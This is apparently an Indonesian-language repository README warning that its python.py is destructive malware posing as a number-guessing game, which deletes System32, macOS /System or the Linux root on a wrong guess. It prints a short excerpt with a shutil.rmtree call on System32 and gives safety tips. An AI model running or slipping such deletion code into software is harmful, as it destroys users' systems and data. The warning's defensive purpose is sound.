# ⚠️ PERINGATAN BAHAYA - JANGAN JALANKAN KODE INI! ⚠️

## Tentang Repositori Ini

Repositori ini berisi kode Python yang **SANGAT BERBAHAYA** dan dapat merusak sistem operasi Anda secara permanen.

## ⛔ BAHAYA KODE INI

Kode `python.py` dalam repositori ini mengandung perintah yang dapat:

- **Windows**: Menghapus folder `C:\windows\System32` (akan merusak Windows secara total)
- **macOS**: Menghapus folder `/System` (akan merusak macOS secara total)  
- **Linux**: Menghapus seluruh sistem file `/` (akan menghancurkan seluruh sistem Linux)

## 🚨 JANGAN PERNAH MENJALANKAN KODE INI

Kode ini dirancang sebagai **malware** yang menyamar sebagai permainan tebak angka sederhana. Jika dijalankan:

1. Program akan meminta Anda menebak angka 1 atau 2
2. Jika tebakan salah, program akan **MENGHAPUS FILE SISTEM PENTING**
3. Hal ini akan membuat komputer Anda **TIDAK DAPAT DIGUNAKAN**
4. Data Anda akan **HILANG PERMANEN**

## 📋 Cara Kerja Kode (Untuk Edukasi)

```python
# Program meminta input tebakan angka
tebak_angka = int(input("Tebak angka (1 atau 2): "))

# Jika tebakan salah, program akan mendeteksi OS
if tebakan_angka != angka:
    system = platform.system()
    
    # Kemudian menjalankan perintah destruktif berdasarkan OS
    if system == "Windows":
        shutil.rmtree("C:\\windows\\System32")  # BERBAHAYA!
```

## 🛡️ Perlindungan

- **JANGAN** download atau jalankan file `python.py`
- **JANGAN** copy-paste kode ini ke terminal/command prompt
- **SELALU** berhati-hati dengan kode dari sumber yang tidak terpercaya
- Gunakan antivirus yang up-to-date

## 📚 Tujuan Edukasi

Repositori ini mungkin dibuat untuk:
- Menunjukkan bahaya kode malicious
- Edukasi keamanan siber
- Contoh bagaimana malware dapat menyamar

## 🔒 Keamanan Siber - Tips

1. **Selalu review kode** sebelum menjalankannya
2. **Jangan jalankan script** dari sumber tidak terpercaya
3. **Backup data** secara rutin
4. **Gunakan sandbox** untuk testing kode mencurigakan
5. **Install antivirus** yang reliable

## ⚖️ Disclaimer

- Kode ini hanya untuk **tujuan edukasi keamanan**
- **TIDAK** untuk dijalankan di sistem production
- Penulis **TIDAK bertanggung jawab** atas kerusakan yang terjadi
- Penggunaan kode ini sepenuhnya **RISIKO SENDIRI**

---

**INGAT: Keamanan siber dimulai dari kesadaran diri sendiri!**

## 📞 Kontak

Jika Anda menemukan repositori ini secara tidak sengaja, segera laporkan sebagai konten berbahaya.

---
*README ini dibuat untuk melindungi pengguna dari kode berbahaya.*